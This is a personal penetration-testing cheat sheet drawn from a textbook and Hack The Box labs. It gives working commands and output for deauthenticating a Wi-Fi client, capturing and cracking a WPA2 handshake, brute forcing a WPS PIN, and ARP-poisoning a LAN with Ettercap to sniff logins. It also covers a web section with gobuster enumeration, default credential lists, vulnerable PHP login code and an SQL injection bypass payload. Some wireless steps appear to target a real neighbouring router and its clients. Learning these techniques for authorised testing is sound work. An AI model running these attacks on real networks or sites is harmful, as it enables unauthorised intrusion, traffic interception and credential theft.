PENTESTING:PENETRATION TESTING CHEAT SHEET BY GV

Resources: 
Penetration Testing - A hands-on introduction to Hacking by Georgia Weidman
Hack The Box Tutorials

##Wifi PenTesting
aircrack-ng is required - available by apt install under Debian.

.B Steps 
$ airmon-ng check
$ airmon-ng check kill                 # kill all processes interfering with wlan0 : NetworkManager and wpa_supplicant
$ airmon-ng start wlan0                # disables wlan0 and installs a virtual device wlan0mon in monitor mode
$ airodump-ng wlan0mon --channel 11    # wlan0 will gather all wireless packets from all nearby APs

.B Restoring:
$ airmon-ng stop wlan0mon # will remove the temp virtual wlan0mon and re-enable wlan0
$ NetworkManager          # will re-enable network manager and wpa_supplicant. Alternative : $ service network-manager start

.B Tips:
https://www.aircrack-ng.org/doku.php?id=airodump-ng
My rtl8723be under Debian seems not to capture anything. 
You need a WiFi adapter capable to operate in monitor mode and you also need drivers (usually customized) that will make use of the monitor mode.

$ iw list         # will provide info about wlan0  including supported modes:
......
......
Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor
                 * mesh point
                 * P2P-client
                 * P2P-GO
.......
.......

 
$ iwconfig                        # show info about current session of wlan - includes active mode (monitor/managed) 
$ ifconfig wlan0 down             # Brings down the wlan0 - required before setting any modes - it seems that when mode is managed this is ignored.
$ iwconfig wlan0 mode monitor     # Force wlan0 to be in monitor mode. I was expecting airodump-ng wlan0 to work
$ iwconfig wlan0mon mode monitor  # Forcing monitor mode - Shouldn't aircrack supposed to do that...? 
$ iwconfig wlan0 mode managed     # Should be this mode in order NetworkManager do it's job
$ ifconfig wlan0 up               # Bring wlan0 up
$ iw wlan0 set power_save off     # disables power save
$ alias stopwlan0monitor='ifconfig wlan0 down && sleep 1 && iwconfig wlan0 mode managed && sleep 1 && ifconfig wlan0 up && sleep 1 && NetworkManager'

$ nano /etc/NetworkManager/NetworkManager.conf                    # Tweaking network manager conf file
[keyfile]                                                         # Add this line and the next one in conf file
unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon # with this tweak you don't need to kill networkmanager (untested)


## Customized rtl8723be drivers:
https://github.com/lwfinger/rtlwifi_new
https://forums.kali.org/showthread.php?22638-rtl8723be-wireless-driver-installation
http://www.aircrack-ng.org/doku.php?id=compat-wireless


## Alternative approach that worked:
$ iwconfig              # managed mode, connected to my home wifi
$ airmon-ng check kill  # killing network manager
$ ifconfig wlan0 down   # bring down the wlan0
$ aireplay-ng -9 wlan0    # -9 is a short code for injection testing- It seems that automatically brings up wlan0 on monitor mode
Among other is get a message :
........
00:29:34  Injection is working!
........
APs info
..........

$ iwconfig
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.467 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:off

$ airodump-ng wlan0 --channel 11 # WORKED FINE - It seems that defining a channel works better. But it worked either without --channel
To restore use alias exitmonitor (see above)

##Capturing packets
Next we need to capture some packages by the desired router.
We need two terminal windows for this operation.

.B Terminal 1:
$ airodump-ng --channel 1 --bssid D0:60:8C:06:71:86 -w /home/gv/Desktop/ wlan0  # -w: write to /home/gv/Desktop/  
CH  1 ][ Elapsed: 4 mins ][ 2018-02-18 02:44 ][ WPA handshake: D0:60:8C:06:71:86                                         
                                                                                                                                     
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                     
 D0:60:8C:06:71:86  -83  27      939       14    0   1  54e  WPA2 CCMP   PSK  COSMOTE-067186                                         
                                                                                                                                     
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                           
                                                                                                                                     
 D0:60:8C:06:71:86  7C:0B:C6:54:85:08  -85    1e- 1e     0        2                                                                   
 D0:60:8C:06:71:86  EC:9B:F3:A1:C5:1D   -1    1e- 0      0        2                                                                   
 D0:60:8C:06:71:86  62:E3:27:80:03:3E  -79    1e- 1e     0      289  COSMOTE-067186                                                   
 D0:60:8C:06:71:86  62:E3:27:97:1C:34  -81    0 - 1      0        4                                                                   
 D0:60:8C:06:71:86  66:E3:27:F0:14:0A  -81    0 - 1      0        3                                                                   

.B Terminal 2:
You need to pick a client in order to kick him out of the rooter and force him to make a new handshake with the router.
$ aireplay-ng -0 1 -a <routermac> -c <clientmac> wlan0
$ aireplay-ng -0 1 -a D0:60:8C:06:71:86 -c 62:E3:27:80:03:3E wlan0
# You should see some info DeAuthentication of the client and reconnection

The job is finished if the message [ WPA handshake: D0:60:8C:06:71:86 appears on top of terminal 1
If this messaged is not shown, handshake is not capture and you need to keep kicking out the client.

Now that you have capture a handshake you can verify it with whireshark - open file - select the cap file and filter packets for eapol
You should see 4 messages = 4 way handshake. Sometimes, though that airodump claims that captured a handshake , you don't see 4 messages in wireshark. In this case you need to repeat the process.

##Cracking WPA Key
https://www.youtube.com/watch?v=CN61riNkmEU
Once you have a good .cap file with all 4 handshake messages you can attack (offline) to the cap file to decode the key.

$ aircrack-ng -a2 -b [router bssid] -w path/to/wordlist /path/to/capfile.cap  #Georgia skips -a2 (-a = attack mode, 2=WPA (1 is WEP))

##More Tips:
alias startwlan0monitor='airmon-ng check kill && ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up && aireplay-ng -9 wlan0 && airodump-ng wlan0'

1. http://aircrack-ng.org/doku.php?id=aircrack-ng#other_tips

2. aircrack-ng -w firstlist.txt,secondlist.txt,thirdlist.txt wpa2.eapol.cap  #providing three different word list files

3. john --stdout --wordlist=specialrules.lst --rules | aircrack-ng -e test -a 2 -w - /root/capture/wpa.cap  #attack using john the ripper

4. tshark -r <input file name> -R "eapol || wlan.fc.type_subtype == 0x08" -w <output file name>  #isolate/extract eapol 4way handshake to a smaller file

5. grep -E '^.{8,63}$' < inputfile  #WPA passwords are 8 to 63 chars long. This grep will skip passwords <8 or >63 chars.

##Finding/building a wordlist
http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
http://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html
https://github.com/routerkeygen/routerkeygenPC
http://amitis1.blogspot.gr/2013/07/facebook.html
https://hashcat.net/forum/thread-6170.html
http://www.kalitutorials.net/2014/04/hack-wpawpa2-wps-reaver-kali-linux.html
http://to-markoutso.blogspot.gr/p/speedtouch-crack.html


Is quite common that people does not change the default PSK (pre shared key). 
We need some dictionaries including default PSKeys for various routers.

## Bruteforcing WPS Pin on Routers with WPS enabled
https://hackercool.com/2015/07/wpawpa2-password-cracking-with-bully/

$ bully -b F4:06:8D:6E:AC:4C -c 6 -B wlan0  #-b is the rooter mac, -c is the channel , -B stands for Bruteforce, wlan0 is the interface in use

Above bully run for an hour in target router with out result.

##Cracking WEP Encryption
Penetration Testing Book - page 347


PENTESTING:MITM / ARP POISONING
https://dotweak.com/2019/10/27/how-to-do-a-man-in-the-middle-attack-using-arp-poisoning-c1N3TGhyN21TNEtQUW9McURkYTY4dz09?fbclid=IwAR3pqyk49Bm4rTSmDOc1B14mVWuZuPsxTyGXSrIuFO5yjjfVbT0oVbF-Snk
A man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communications between 
two parties who believe they are directly communicating with each other. 
In this case, the victims think that they are communicating with each other, but in reality, the attacker is controlling the communication. 
A MITM attack can succeed only when the attacker impersonates each endpoint sufficiently well to satisfy their expectations.

##Ettercap Tool
Now that Ettercap is already installed in your machine, we will tweak a little bit of the configuration file of Ettercap to optimize the results provided by the tool.

sudo nano /etc/ettercap/etter.conf
The ec_uid and ec_gid lines must be set to 0 in order for the program service to work on behalf of the superuser:

[privs]
ec_uid = 0 # nobody is the default
ec_gid = 0 # nobody is the default

Then you need to find and uncomment these two lines:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

Above line try to handle http as simple http. Be warned, all web sites that have provided a certificate will not be available (certificate error)

The program can work in several modes - with a graphical interface, without and as a service. We will consider work in the graphical interface. To run a program with a GTK interface, use the -G option:

sudo -E ettercap -G
We use the -E option for sudo to save all of our user's environment variables.

.B ARP poisoning Attack using Ettercap

This attack anatomy allows us to force the target computer to send packets to us instead to send it to the router.

Let us get to the point and execute the Ettercap ARP Poisoning Attack In Ettercap, click on the Sniff > Unified Sniffing and in the new popup select your network interface referenced in the below screenshot by wlp2s0.
It's now the time to scan the network and list the devices currently connected. In order to do it, simply click the hosts > scan for hosts. It will start scanning the whole network for the alive hosts. Once the scan is done, click again the hosts > hosts list to see the list of the hosts available in the network.

.B Important: 
This list also includes the default gateway address so we have to be careful when we select the targets

We will select the targets from our list of hosts. In a MITM attack, the attacker intercepts the network and sniffs the packets. 
In our man-in-the-middle scenario, our target machine is 192.168.1.104 and our router is 192.168.1.1. 
In Ettercap, just click to target 1 (192.168.1.104) and select (right click) add to target 1. 
Repeat the same with target 2 and select add to target 2.

click the Mitm > ARP poisoning and click OK. Thereafter, check the option Sniff remote connections and click OK.

Click start > start sniffing. This will start ARP poisoning in the network which means we have enabled our network card in promiscuous mode and now the local traffic can be sniffed.

Note: We have allowed only HTTP sniffing with Ettercap, so don’t expect HTTPS packets to be sniffed with this process. From this simple example, if our victim logged into some websites we will get the output into our Ettercap console.

The program is now sending packets to the network, with a request for 192.168.1.104 to update the ARP cache and replace the MAC address 
of the router with yours. The attack is started and successfully executed. 
You can open the View -> Connections menu and see the active connections for the target device.

If a packet is sent through the network without encryption method, then we can view the transmitted information by clicking on the connection row. 
The informations sent are displayed on the left side, and the informations received are displayed on the right.

Any sensitive information, such as the data passed through a login form, a registration form, a contact form, etc ... as long they are not 
encrypted, can be parsed by the attacker examining the content of every rows and them values.

------------------------------------------------------------------------------------------------------------------------------------------

PENTESTING:WEB SITE EXPLOIT 
Source: Hack the Box
We are dealing with a web server that listens on typical port 80, and when you visit this port you arrive at web servers login page and you are prompted for username and password.

##GOBUSTER Tool
Gobuster is one tool used to brute force directories on a webserver through a specially made list of variables known as the wordlist 
in an attempt to guess the correct input for it to be validated and access to be gained. 

GoBuster can be found available in Debian Repos (apt install gobuster) and is written in GoLang. 

If gobuster is not available in your distro repos then you can do something like bellow alternatives:
 
.B Gobuster installation using the go install command

.I go install github.com/OJ/gobuster/v3@latest
You need to have Go installed

.B Building from source code and compiling
source : Hack The Box

.I git clone https://github.com/OJ/gobuster.git

After cloning there will be a gobuster folder in the directory you are currently in. 
The gobuster has external dependencies, and so they need to be pulled in first:
.I go get 
.I go build #This will create a gobuster binary for you. 

If you want to install it in the $GOPATH/bin folder, you can run:
.I go install

If you have all the dependencies already, you can make use of the build scripts:
make - builds for the current Go configuration (i.e., runs go build ).
make windows - builds 32 and 64-bit binaries for Windows and writes them to the build folder.
make linux - builds 32 and 64-bit binaries for Linux and writes them to the build folder.
make darwin - builds 32 and 64-bit binaries for Darwin and writes them to the build folder.
make all - builds for all platforms and architectures, and writes the resulting binaries to the build folder.
make clean - clears out the build folder.
make test - runs the tests.

.B Using Gobuster
In order to use GoBuster we need a wordlist. 
There is a dedicated folder with a myriad of wordlists, dictionaries, and rainbow tables that comes pre-installed with Parrot OS, found under the path /usr/share/wordlists .

To download this list (if not available in your distro):
.I git clone https://github.com/danielmiessler/SecLists.git

Now we can ue GoBuster with the following options:
.SY GoBuster_Options:
dir			: Specify that we wish to do web directory enumeration.
--url		: Specify the web address of the target machine that runs the HTTP server.
--wordlist	: Specify the wordlist that we want to use.
.YS

Typical usage:
.RS 
gobuster dir --url http://{targetIP}/ --wordlist {wordlist-directory}/directory-list-2.3-small.txt
gobuster dir --url http://10.129.236.49 --wordlist /home/gv/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
.RE

Results:
.RS
gv@debssd:~/Desktop$ gobuster dir --url http://10.129.236.49 --wordlist /home/gv/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.236.49
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/gv/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/10/01 16:40:56 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.236.49/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.236.49/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.236.49/js/]
/vendor               (Status: 301) [Size: 315] [--> http://10.129.236.49/vendor/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.236.49/fonts/]
Progress: 87653 / 87665 (99.99%)
===============================================================
2023/10/01 16:50:51 Finished
===============================================================
.SE

##Default Credentials
Since GoBuster did not find anything usefull that can be exploitable, we can try the most common combinations in the username and password fields, such as:
admin:admin
guest:guest
user:user
root:root
administrator:password

No success. 
We could, hypothetically, use a tool to attempt brute-forcing the log-in page. 
However, that would take much time and might trigger a security measure.

## SQL Injection
SQL Injection is a common way of exploiting web pages that use `SQL Statements` that
retrieve and store user input data. If configured incorrectly, one can use this attack
to exploit the well-known `SQL Injection` vulnerability, which is very dangerous. There
are many different techniques of protecting from SQL injections, some of them being
input validation, parameterized queries, stored procedures, and implementing a WAF (Web
Application Firewall) on the perimeter of the server's network. However, instances can
be found where none of these fixes are in place, hence why this type of attack is
prevalent, according to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) list
of web vulnerabilities.

.B SQL authentication using PHP & SQL:
This is a sample of vulnerable PHP Code that deals with SQL. Our "HTB machine" is equipped with a similar code. 

.RS 
<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.
$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.

if ($count==1){
# Checks if there's at least 1 result, and if yes:
$_SESSION['username'] = $username; # Creates a session with the specified $username.
$_SESSION['password'] = $password; # Creates a session with the specified $password.
header("location:home.php"); # Redirect to homepage.
}
else { 
# If there's no singular result of a user/pass combination:
header("location:login.php");
# No redirection, as the login failed in the case the $count variable is not equal to 1, HTTP Response code 200 OK.
}
?>

.SE

.B Explanation of the vulnerability

This code above is vulnerable to SQL Injection attacks, where you can modify the query (the $sql variable)
through the log-in form on the web page to make the query do something that is not supposed to do - bypass the log-in altogether!

In our case, since it seems that web server is not making any kind of login page input data validation, we can provide the following username:
admin '#

The ['] char after admin will forcibly close the sql query and the [#] char will make everything after 'admin' to be a comment.
As a result, the password checking is skipped since it is commented out. 
You can provide even "a" as password - no worries , it will be commented out by the #.

If we look further down in the PHP code above, we will see that the code will only approve the log-in once there is precisely one result 
of our username and password combination. However, since we have skipped the password search part of our query, the script will now
only search if any entry exists with the username admin . In this case, we got lucky. 
There is indeed an account called admin , which will validate our SQL Injection and return the 1 value for the $count variable,
which will be put through the if statement , allowing us to log-in without knowing the password. 
If there was no admin account, we could try any other accounts until we found one that existed. ( administrator, root, john_doe, etc.) 
Any valid, existing username would make our SQL Injection work.

More presisely the sql query search using username = admin'# 
will be like this:

SELECT * FROM users WHERE username='admin'# AND password='a' 
which in reality is translated to this due to # (comment) char:
SELECT * FROM users WHERE username='admin'
